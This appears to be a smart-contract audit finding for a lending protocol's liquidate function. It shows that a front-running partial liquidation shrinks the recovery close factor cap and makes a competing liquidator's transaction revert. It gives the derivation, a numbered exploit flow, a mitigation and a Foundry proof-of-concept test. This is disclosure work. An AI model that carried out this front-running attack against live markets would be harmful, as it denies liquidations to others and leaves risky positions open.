### Title
Front-run partial liquidation reduces `maxRepaid` below victim's `repaidUnits`, causing `RecoveryCloseFactorConditionsViolated()` revert - (`src/Midnight.sol`)

### Summary

The RCF cap `maxRepaid` is computed live from `_position.debt - maxDebt` at call time. A partial liquidation by any unprivileged attacker reduces both `_position.debt` and `maxDebt`, but the net effect is that `maxRepaid` shrinks by exactly `attackerRepaidUnits`. Because the rcfThreshold small-collateral exception is invariant under partial liquidations, an attacker can front-run any victim liquidator with a profitable partial liquidation that leaves the position unhealthy yet makes the victim's `repaidUnits` exceed the new, smaller `maxRepaid`, causing a revert.

### Finding Description

**Code path:** `src/Midnight.sol` lines 655–667 (the RCF check inside `liquidate`).

```
uint256 maxRepaid = lltv < WAD
    ? (_position.debt - maxDebt).mulDivUp(WAD * WAD, WAD * WAD - lif * lltv)
    : type(uint256).max;
require(
    repaidUnits <= maxRepaid
        || _position.collateral[collateralIndex]
               .mulDivDown(liquidatedCollatPrice, ORACLE_PRICE_SCALE)
               .mulDivDown(WAD, lif).zeroFloorSub(maxRepaid) < market.rcfThreshold,
    RecoveryCloseFactorConditionsViolated()
);
``` [1](#0-0) 

**Root cause — `maxRepaid` is not monotone across sequential liquidations.**

After the attacker's partial liquidation of `A` units:
- `_position.debt` decreases by `A`
- `_position.collateral` decreases by `A * lif / price` (line 652)
- `maxDebt` (recomputed from current collateral) decreases by `A * lif * lltv / WAD` [2](#0-1) 

Therefore:

```
newDebt - newMaxDebt
  = (debt - A) - (maxDebt - A·lif·lltv/WAD)
  = (debt - maxDebt) - A·(WAD - lif·lltv)/WAD

newMaxRepaid = (newDebt - newMaxDebt) / (1 - lif·lltv)
             = originalMaxRepaid - A
```

The new `maxRepaid` is exactly `originalMaxRepaid - A`.

**The rcfThreshold exception is invariant.** The exception fires when:

```
collateral · price / lif - maxRepaid < rcfThreshold
```

After the attacker's partial liquidation this expression evaluates to:

```
(collateral - A·lif/price)·price/lif - (originalMaxRepaid - A)
= collateral·price/lif - A - originalMaxRepaid + A
= collateral·price/lif - originalMaxRepaid   ← identical to pre-attack value
``` [3](#0-2) 

So if the exception did not apply before the attack, it does not apply after.

**Exploit flow:**

1. Borrower is unhealthy (`debt > maxDebt`), no bad debt, RCF active (rcfThreshold exception does not apply).
2. `originalMaxRepaid = (debt - maxDebt) · WAD² / (WAD² - lif · lltv)`.
3. Victim liquidator broadcasts tx with `victimRepaidUnits` where `1 < victimRepaidUnits ≤ originalMaxRepaid`.
4. Attacker front-runs with `attackerRepaidUnits` chosen so that:
   - `attackerRepaidUnits < originalMaxRepaid` (position stays unhealthy, attacker passes RCF)
   - `attackerRepaidUnits > originalMaxRepaid - victimRepaidUnits` (so `newMaxRepaid < victimRepaidUnits`)
5. Victim's tx executes: `_position.debt` and `maxDebt` are now smaller; `newMaxRepaid = originalMaxRepaid - attackerRepaidUnits < victimRepaidUnits`; rcfThreshold exception still does not apply → revert with `RecoveryCloseFactorConditionsViolated()`.

The attacker profits because they seize collateral at a `lif > 1` discount. The attack is repeatable: every time the victim resubmits, the attacker can front-run again with a fresh partial liquidation. [4](#0-3) 

### Impact Explanation

Any unprivileged liquidator can permanently prevent a competing liquidator from executing a full (or large partial) liquidation of any unhealthy position by repeatedly front-running with small profitable partial liquidations. The victim's tx always reverts with `RecoveryCloseFactorConditionsViolated()`. The position remains unhealthy and continues to accumulate risk, while the attacker extracts all liquidation profit.

### Likelihood Explanation

**Preconditions:**
- Borrower is unhealthy (`debt > maxDebt`) in normal (pre-maturity) mode.
- RCF is active: `collateral · price / lif - maxRepaid ≥ rcfThreshold` (i.e., the small-collateral exception does not apply).
- Victim liquidator submits `repaidUnits > 1`.

These are the standard conditions for any contested liquidation. On a chain with a public mempool the attacker can observe the victim's pending tx and front-run with a single `liquidate` call. The attack is economically self-funding (attacker profits from the partial liquidation) and can be repeated indefinitely.

### Recommendation

Add a caller-supplied `minRepaidUnits` (slippage guard) parameter to `liquidate`, reverting if the actual `maxRepaid` at execution time is below the caller's minimum. Alternatively, compute `maxRepaid` before any state changes and pass it as a lower bound that the caller can assert against off-chain. A simpler mitigation is to document that liquidators must use `seizedAssets` (collateral-denominated input) rather than `repaidUnits`, since the collateral path is not subject to the same front-run shrinkage — though this does not fully eliminate the issue.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Foundry fuzz test plan
// Run: forge test --match-test testFrontRunRCFDoS -vvv

function testFrontRunRCFDoS(
    uint256 units,
    uint256 liquidationOraclePrice,
    uint256 attackerRepaidUnits
) public {
    // Preconditions: unhealthy, no bad debt, RCF active
    units = bound(units, 100, MAX_UNITS);
    liquidationOraclePrice = bound(
        liquidationOraclePrice,
        badDebtPriceDown(units) + 1,   // no bad debt
        ORACLE_PRICE_SCALE - 1          // unhealthy
    );
    _setupUnhealthy(units, liquidationOraclePrice);

    uint256 originalMaxRepaid = _maxRepaid(units, units, liquidationOraclePrice);
    vm.assume(originalMaxRepaid >= 2); // need room for both attacker and victim

    // Victim wants to repay exactly originalMaxRepaid (valid pre-attack)
    uint256 victimRepaidUnits = originalMaxRepaid;

    // Attacker front-runs with a partial liquidation that shrinks maxRepaid below victim's amount
    // Attacker repays 1 unit → newMaxRepaid = originalMaxRepaid - 1 < victimRepaidUnits
    attackerRepaidUnits = bound(attackerRepaidUnits, 1, originalMaxRepaid - 1);

    // Attacker's call succeeds (profitable: gets collateral at lif discount)
    deal(address(loanToken), attacker, attackerRepaidUnits);
    vm.startPrank(attacker);
    loanToken.approve(address(midnight), attackerRepaidUnits);
    midnight.liquidate(market, 0, 0, attackerRepaidUnits, borrower, false, attacker, address(0), "");
    vm.stopPrank();

    // Position is still unhealthy (attacker repaid < originalMaxRepaid)
    assertGt(midnight.debtOf(id, borrower), 0);
    assertTrue(!midnight.isHealthy(market, id, borrower));

    // Victim's call reverts with RecoveryCloseFactorConditionsViolated
    // because newMaxRepaid = originalMaxRepaid - attackerRepaidUnits < victimRepaidUnits
    deal(address(loanToken), victim, victimRepaidUnits);
    vm.startPrank(victim);
    loanToken.approve(address(midnight), victimRepaidUnits);
    vm.expectRevert(IMidnight.RecoveryCloseFactorConditionsViolated.selector);
    midnight.liquidate(market, 0, 0, victimRepaidUnits, borrower, false, victim, address(0), "");
    vm.stopPrank();
}
```

Expected assertion: `RecoveryCloseFactorConditionsViolated()` is thrown on the victim's call after the attacker's partial front-run, confirming the DoS. [5](#0-4) [6](#0-5)
